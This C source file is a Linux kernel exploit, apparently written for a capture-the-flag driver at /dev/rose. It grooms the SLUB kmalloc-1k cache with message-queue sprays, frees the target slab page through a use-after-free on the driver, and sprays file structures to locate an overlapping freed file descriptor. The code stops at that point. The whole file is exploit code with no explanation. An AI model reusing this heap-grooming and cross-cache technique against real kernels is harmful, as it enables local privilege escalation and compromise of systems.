#define _GNU_SOURCE
#include <wchar.h>
#include <bits/types/struct_itimerspec.h>
#include <bits/time.h>
#include <sys/timerfd.h>
#include <stddef.h>
#include <limits.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <netinet/in.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <limits.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <linux/keyctl.h>
#include <sys/shm.h>
#include <ctype.h>

#define NUMBER_FDS 8
#define MSG_SIZE 0x2d0
#define CPU_PARTIAL 25
#define OBJS_PER_SLAB 8
#define NUM_OVERFLOW_SLABS 4
#define OVERFLOW_FACTOR 5

//to make life easier
#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

char * filepath = "/dev/rose\0";
int rfds[NUMBER_FDS];

struct msgb{
    long mtype;
    char mtext[MSG_SIZE];
};

struct slab{
    struct slab* next;
    //after is an array of objects defined by the number of objects per slab;
    uint64_t *objects;
};

enum{
    FILL_PARTIAL = 0,
    FILL_OVERFLOW,
    EMPTY_TARGET,
    RELEASE_PARTIAL
};

struct kmem_cache{
    uint16_t cpu_partial;
    uint16_t objs_per_slab;
    struct slab *overflow_slabs;
    struct slab *pre_victim_slabs;
    struct slab *post_victim_slabs;
    struct slab *target;
    uint64_t (*allocate)(uint64_t);
    uint64_t (*free)(uint64_t);
    uint16_t state;
};

struct kmem_cache *kmalloc_1k;

static uint64_t alloc_kmalloc1k_msg(uint64_t msqid){
    struct {
        long mtype;
        char mtext[MSG_SIZE];
    } msg;
    msg.mtype = 1;
    SYSCHK(memset(msg.mtext, 0x41, MSG_SIZE - 1));
    msg.mtext[MSG_SIZE-1] = 0;
    SYSCHK(msgsnd(msqid, &msg, sizeof(msg.mtext), 0));
    //printf("msqid [alloc]: 0x%08.lx\n", msqid);
    return msqid;
}

static uint64_t free_kmalloc1k_msg(uint64_t msqid){
    struct {
        long mtype;
        char mtext[MSG_SIZE];
    } msg;
    msg.mtype = 0;
    printf("msqid [free]: 0x%x\n", (uint)msqid);
    SYSCHK(msgrcv(msqid, &msg, sizeof(msg.mtext), 0, IPC_NOWAIT | MSG_NOERROR));
    //puts(msg.mtext);
    return 0;
}

void init_msq(uint64_t *repo, uint32_t to_alloc ) {
    for (int i = 0; i < to_alloc ; i++) {
        repo[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (repo[i] < 0) {
            puts("[-] msgget() fail\n");
            exit(-1);
        }
    }
}

struct slab* allocate_slab(uint objs_per_slab){
    struct slab* ret;
    ret = malloc(0x200); 
    ret->next = NULL;
    ret->objects = (unsigned long*)ret+0x10;
    return ret;
}

struct kmem_cache* init_cache(uint16_t objs_per_slab, uint16_t cpu_partial, void* allocate, void* free_func){
    struct slab* previous;
    struct slab* current;
    struct kmem_cache *cache;

    cache = malloc(sizeof(struct kmem_cache)); 

    //initiate helpful values
    cache->objs_per_slab = objs_per_slab;
    cache->cpu_partial = cpu_partial;
    cache->allocate = allocate;
    cache->free = free_func;

    //allocate pre-victim slabs
    current = allocate_slab(objs_per_slab);
    cache->pre_victim_slabs = current;
    previous = current;
    for(uint i = 1; i < (cpu_partial+1) * OVERFLOW_FACTOR; i++){
        current = allocate_slab(objs_per_slab);
        previous->next = current;
        previous = current;
        init_msq(current->objects, 8);
    }

    //allocate target
    cache->target = allocate_slab(objs_per_slab);
    init_msq(cache->target->objects, 7);
    //allocate overflow
    current = allocate_slab(objs_per_slab);
    cache->overflow_slabs = current;
    init_msq(cache->overflow_slabs->objects, 9);
    return cache;
}

void fill_partial(struct kmem_cache* cache){
    struct slab* current = cache->pre_victim_slabs;
    for(uint i = 0; i < (cache->cpu_partial + 1) * OVERFLOW_FACTOR; i++){
        //fill up a slabs worth of data;
        for(uint j = 0; j < cache->objs_per_slab; j++)
            current->objects[j] = cache->allocate(current->objects[j]);
        current = current->next;
    }
}

void fill_target(struct kmem_cache* cache){
    uint i;
    struct slab* target = cache->target;
    for(i = 0; i < cache->objs_per_slab-1; i++)
        target->objects[i] = cache->allocate(target->objects[i]);
    return;
}

void fill_overflow(struct kmem_cache* cache){
    struct slab* current = cache->overflow_slabs;
    //fill up a slabs worth of data;
    for(uint j = 0; j < 9; j++){
        current->objects[j] = cache->allocate(current->objects[j]);
        printf("current->objects[%d]: %x\n", j, (uint)current->objects[j]);
    }
}

void empty_target(struct kmem_cache* cache){
    uint i;
    struct slab* current = cache->target;
    printf("[*] empty_target\n");
    for(i = 0; i < cache->objs_per_slab-1; i++){
        current->objects[i] = cache->free(current->objects[i]);
        current->objects[i] = -1;
    }

    current = cache->overflow_slabs;
    //by also freeing objs_per_slab -1 from the first overflow cache, I ensure that that
    //the page containing the UAF'd file is empty
    //printf("[*] pointer stored in free for the object: %p\n", cache->free);
    printf("[*] empty overflow\n");
    for(i = 0; i < cache->objs_per_slab+1; i++){
        current->objects[i] = cache->free(current->objects[i]);
        current->objects[i] = -1;
    }
    return;
}

void free_one_partials(struct kmem_cache *cache){
    for(struct slab* current = cache->pre_victim_slabs; current != NULL; current = current->next) { 
        cache->free(current->objects[0]);
        current->objects[0] = -1;
    }
    return;
}

void deinit_slab(struct slab* head){
    struct slab* previous = head;
    head = head->next;
    for(;head != NULL; head = head->next){
        previous->next = NULL;
        previous->objects = NULL;
        printf("[*] deinit slab freeing %p\n", previous);
        free(previous);
        previous = head;
    }
    previous->next = NULL;
    previous->objects = NULL;
    printf("[*] deinit slab freeing %p\n", previous);
    free(previous);
    return;
}

void cleanup_messages(struct kmem_cache *cache){
    struct slab* current = cache->pre_victim_slabs;
    //recieve all messages
    puts("[*] recieve hanging messages from the partial slabs");
    for(;current != NULL; current = current->next){
        for(uint i = 1; i < cache->objs_per_slab; i++){
            current->objects[i] = cache->free(current->objects[i]);
            current->objects[i] = -1;
        }
    }

    //puts("[*] recieve last message in the first overflow cache");
    //current = cache->overflow_slabs;
    //current->objects[cache->objs_per_slab] = cache->free(current->objects[7]);
    //current->objects[cache->objs_per_slab] = cache->free(0xc7);

//    puts("[*] recieve remaining messages in the overflow cache");
    //current = current->next;
    //for(;current != NULL; current = current->next){
    //    for(uint i = 0; i < cache->objs_per_slab; i++)
    //        current->objects[i] = cache->free(current->objects[i]);
    //}
}

static int rlimit_increase(int rlimit)
{
    struct rlimit r;
    if (getrlimit(rlimit, &r))
        puts("rlimit_increase:getrlimit");

    if (r.rlim_max <= r.rlim_cur)
    {
        printf("[+] rlimit %d remains at %.lld", rlimit, r.rlim_cur);
        return 0;
    }
    r.rlim_cur = r.rlim_max;
    int res;
    if (res = setrlimit(rlimit, &r))
        puts("rlimit_increase:setrlimit");
    else
        printf("[+] rlimit %d increased to %lld\n", rlimit, r.rlim_max);
    return res;
}

void deinit_cache(struct kmem_cache *cache){
    cleanup_messages(cache);
    //free the personally created objects
    //puts("[*] free all items from the setup slabs");
    //deinit_slab(cache->pre_victim_slabs);
    //puts("[*] free all items from the target slab");
    //deinit_slab(cache->target);
    //puts("[*] free all items from the remaining overflow slabs");
    //deinit_slab(cache->overflow_slabs);
    free(cache);
}

void err_log(char * string){
    printf("[X] %s\n", string); 
    exit(1);
}

void info_log(char * message){
    printf("[*] %s\n", message);
    return;
}

void bulk_log(void *mem, unsigned int len)
{
    unsigned int i,j;
    for(i = 0; i < len; i+=32){
        printf("[0x%x] ", i);
        for(j = 0; j < 4; j++){
            if(i + j*8 > len) putchar('\n'); return;
            printf("0x%.08lx ", (unsigned long)mem+i+j*8);
        }
        putchar('\n');
    }
    return;
}

int open_rose(){
    int rfd = SYSCHK(open(filepath, O_RDWR));
    printf("[*] rose opened with fd: %d\n", rfd);
    return rfd;
}

int freed_fd = -1;

int main(void){
    int fds[0x1000];
    for(int i = 1; i < 5; i++)
        rfds[i] = open_rose();

    system("echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' > /tmp/a");
    rlimit_increase(RLIMIT_NOFILE);
    //setup the context that will track the pointers for all of the objects that are created;
    kmalloc_1k = init_cache(OBJS_PER_SLAB, CPU_PARTIAL, alloc_kmalloc1k_msg, free_kmalloc1k_msg);

    //setup the partial section for the slub allocator
    fill_partial(kmalloc_1k);


    //fill the target
    fill_target(kmalloc_1k);

    //this is the start of the target_array
    rfds[0] = open_rose();

    //ensure that the target slab is no longer the active slab
    puts("[*] filling overflow");
    fill_overflow(kmalloc_1k);

    puts("[*] all objects allocated");
    //empty the target page

    //release the final refrence in the target page
    puts("[*] close first rfd, freeing the entire target slab");
    close(rfds[0]);

    puts("[*] free target slab");
    empty_target(kmalloc_1k);
    //overflow the partial list, causing unfreeze_parreles to be called. this will return
    //the empty page to the page allocator
    puts("[*] free one object from each of the partial slabs");
    free_one_partials(kmalloc_1k);

    //need to release everthing made so far in the cache;
    //this causes the order of the target page to be reset to 0
    puts("[*] free the rest");
    deinit_cache(kmalloc_1k);
    info_log("deinit done");

    info_log("sprating file_structs");
    for(uint i = 0; i < 0x800; i++)
        fds[i] = SYSCHK(open("/tmp/a", O_RDWR));

    info_log("triggering UAF");
    //breakpoint
    close(rfds[1]);
    close(rfds[2]);
    close(rfds[3]);

    info_log("spraying new files");
    int spray_fds_2[0x300];
    for (int i = 0; i < 0x300; i++) {
        spray_fds_2[i] = open("/tmp/a", O_RDWR);
        lseek(spray_fds_2[i], 0x8, SEEK_SET);
    }
    // After: 2 fd 1 refcount (Because new file)

    info_log("trying to search through the old files");
    // The freed fd will have lseek value set to 0x8. Try to find it.
    for (int i = 0; i < 0x300; i++) {
        if (lseek(fds[i], 0 ,SEEK_CUR) == 0x8) {
            freed_fd = fds[i];
            lseek(freed_fd, 0x0, SEEK_SET);
            printf("[+] Found freed fd: %d\n", freed_fd);
            break;
        }
    }
    if (freed_fd == -1)
        err_log("Failed to find FD");


    return 0;
}
